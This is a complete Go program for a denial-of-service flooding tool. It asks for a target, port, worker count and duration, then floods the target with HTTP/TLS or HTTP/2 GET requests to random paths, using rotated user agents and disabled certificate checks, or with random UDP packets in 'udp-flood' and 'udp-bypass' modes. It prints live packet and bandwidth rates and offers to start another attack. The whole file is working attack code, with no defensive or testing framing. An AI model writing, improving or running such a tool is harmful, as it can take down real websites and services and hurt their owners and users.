package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

// ANSI color codes for terminal output
const (
	Reset    = "\033[0m"
	RedLight = "\033[91m"
	Green    = "\033[32m"
	Yellow   = "\033[33m"
	Cyan     = "\033[36m"
	Magenta  = "\033[35m"
	Blue     = "\033[34m"
)

// Holds the configuration for the attack
type AttackConfig struct {
	Target      string
	Method      string
	Port        int
	Workers     int
	Connections int
	Duration    time.Duration
	Timeout     time.Duration
}

// Holds statistics, using atomic integers for safe concurrent access
type AttackStats struct {
	Success atomic.Int64
	Fail    atomic.Int64
	Bytes   atomic.Int64
}

var userAgents []string

// A generic helper to load lines from a file into a slice
func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("%sWarning: Could not open %s. Using default values.%s\n", Yellow, filename, Reset)
		return nil
	}
	defer file.Close()

	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

// A helper to get a random user agent
func randomUserAgent() string {
	if len(userAgents) == 0 {
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
	return userAgents[rand.Intn(len(userAgents))]
}

// A helper to generate a random path for requests
func randomPath() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

// Central function to get all attack parameters from the user
func getConfig(scanner *bufio.Scanner) (*AttackConfig, error) {
	config := &AttackConfig{}

	fmt.Print(Yellow + "Target: " + Reset)
	scanner.Scan()
	config.Target = strings.TrimSpace(scanner.Text())

	fmt.Print(Yellow + "Method (e.g., tls, http2, udp-flood): " + Reset)
	scanner.Scan()
	config.Method = strings.TrimSpace(strings.ToLower(scanner.Text()))

	// A helper function to read an integer from the user
	readInt := func(prompt string, defaultValue int) int {
		fmt.Print(prompt)
		scanner.Scan()
		val, err := strconv.Atoi(scanner.Text())
		if err != nil || val <= 0 {
			return defaultValue
		}
		return val
	}

	config.Port = readInt(Yellow+"Port: "+Reset, 443)
	config.Workers = readInt(Yellow+"Number of workers: "+Reset, 10)
	config.Connections = readInt(Yellow+"Connections per worker: "+Reset, 10)
	durationSec := readInt(Yellow+"Duration (seconds): "+Reset, 30)
	timeoutSec := readInt(Yellow+"Timeout (seconds): "+Reset, 10)

	config.Duration = time.Duration(durationSec) * time.Second
	config.Timeout = time.Duration(timeoutSec) * time.Second

	return config, nil
}

// Main attack function that orchestrates the workers and stats
func runAttack(config *AttackConfig) {
	fmt.Printf("%sStarting attack on %s:%d...%s\n", Green, config.Target, config.Port, Reset)

	ctx, cancel := context.WithTimeout(context.Background(), config.Duration)
	defer cancel()

	stats := &AttackStats{}
	var wg sync.WaitGroup

	// Start the workers
	for i := 0; i < config.Workers; i++ {
		wg.Add(1)
		go worker(ctx, &wg, config, stats)
	}

	// Start the progress tracker
	progressDone := make(chan bool)
	go trackProgress(ctx, config, stats, progressDone)

	wg.Wait()
	<-progressDone // Wait for the final progress report to print
	printSummary(config, stats)
}

// The worker function dispatches to the correct attack logic based on the method
func worker(ctx context.Context, wg *sync.WaitGroup, config *AttackConfig, stats *AttackStats) {
	defer wg.Done()

	switch config.Method {
	case "tls", "http-tls":
		runTLSAttack(ctx, config, stats)
	case "http2", "http2-tls":
		runHTTP2Attack(ctx, config, stats)
	case "udp-flood", "udp-bypass", "udp-gbps":
		runUDPAttack(ctx, config, stats)
	default:
		// Silently exit if the method is unknown
		return
	}
}

// Logic for TLS-based attacks
func runTLSAttack(ctx context.Context, config *AttackConfig, stats *AttackStats) {
	client := &http.Client{
		Timeout: config.Timeout,
		Transport: &http.Transport{
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConnsPerHost:   config.Connections,
			MaxIdleConns:          config.Connections,
			ResponseHeaderTimeout: config.Timeout,
			IdleConnTimeout:       10 * time.Second,
		},
	}
	targetURL := config.Target

	for {
		select {
		case <-ctx.Done():
			return
		default:
			req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", randomUserAgent())
			req.Header.Set("Accept", "*/*")

			resp, err := client.Do(req)
			if err != nil {
				stats.Fail.Add(1)
				continue
			}

			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			stats.Success.Add(1)
		}
	}
}

// Logic for HTTP/2 based attacks
func runHTTP2Attack(ctx context.Context, config *AttackConfig, stats *AttackStats) {
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2:   true,
		MaxIdleConnsPerHost: config.Connections,
	}
	if err := http2.ConfigureTransport(tr); err != nil {
		return // Cannot configure HTTP/2
	}
	client := &http.Client{Transport: tr, Timeout: config.Timeout}
	targetURL := config.Target

	for {
		select {
		case <-ctx.Done():
			return
		default:
			req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", randomUserAgent())

			resp, err := client.Do(req)
			if err != nil {
				stats.Fail.Add(1)
				continue
			}
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			stats.Success.Add(1)
		}
	}
}

// Logic for UDP based attacks
func runUDPAttack(ctx context.Context, config *AttackConfig, stats *AttackStats) {
	addr := fmt.Sprintf("%s:%d", config.Target, config.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()

	packetSize := 1024 // Default size
	if config.Method == "udp-bypass" {
		packetSize = 2048
	}

	payload := make([]byte, packetSize)
	rand.Read(payload)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			n, err := conn.Write(payload)
			if err == nil {
				stats.Success.Add(1)
				stats.Bytes.Add(int64(n))
			} else {
				stats.Fail.Add(1)
			}
		}
	}
}

// Prints live statistics during the attack
func trackProgress(ctx context.Context, config *AttackConfig, stats *AttackStats, done chan bool) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	defer close(done)

	start := time.Now()

	for {
		select {
		case <-ctx.Done():
			// Final print before exiting
			elapsed := time.Since(start).Seconds()
			if elapsed == 0 {
				elapsed = 1
			}
			printProgressLine(config, stats, elapsed)
			fmt.Println() // Newline after final status
			return
		case <-ticker.C:
			elapsed := time.Since(start).Seconds()
			if elapsed == 0 {
				elapsed = 1
			}
			printProgressLine(config, stats, elapsed)
		}
	}
}

// Helper to format a single line of progress
func printProgressLine(config *AttackConfig, stats *AttackStats, elapsed float64) {
	if strings.HasPrefix(config.Method, "udp") {
		// UDP stats
		pkts := stats.Success.Load()
		bytes := stats.Bytes.Load()
		pps := float64(pkts) / elapsed
		bps := float64(bytes) / elapsed
		fmt.Printf("\r%s[UDP] Packets: %d | Fails: %d | PPS: %.2f | Bandwidth: %.2f MBps%s", Blue, pkts, stats.Fail.Load(), pps, bps/1024/1024, Reset)
	} else {
		// HTTP stats
		reqs := stats.Success.Load()
		fails := stats.Fail.Load()
		rps := float64(reqs) / elapsed
		fmt.Printf("\r%s[HTTP] Success: %d | Fails: %d | RPS: %.2f%s", Blue, reqs, fails, rps, Reset)
	}
}

// Prints the final summary after the attack is complete
func printSummary(config *AttackConfig, stats *AttackStats) {
	fmt.Printf("\n%s--- Attack Finished ---%s\n", Magenta, Reset)
	if strings.HasPrefix(config.Method, "udp") {
		fmt.Printf("%sTotal Packets: %d%s\n", Green, stats.Success.Load(), Reset)
		fmt.Printf("%sTotal Bytes Sent: %.2f MB%s\n", Cyan, float64(stats.Bytes.Load())/1024/1024, Reset)
	} else {
		fmt.Printf("%sSuccessful Requests: %d%s\n", Green, stats.Success.Load(), Reset)
		fmt.Printf("%sFailed Requests: %d%s\n", RedLight, stats.Fail.Load(), Reset)
	}
	fmt.Printf("%sDuration: %v%s\n", Cyan, config.Duration, Reset)
}

func main() {
	userAgents = loadListFromFile("useragents.txt")
	scanner := bufio.NewScanner(os.Stdin)

	for {
		config, err := getConfig(scanner)
		if err != nil {
			fmt.Printf("%sError reading config: %v%s\n", RedLight, err, Reset)
			continue
		}

		runAttack(config)

		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
		scanner.Scan()
		if strings.ToLower(scanner.Text()) != "y" {
			break
		}
		fmt.Println()
	}

	fmt.Printf("%sScript stopped.%s\n", Green, Reset)
}
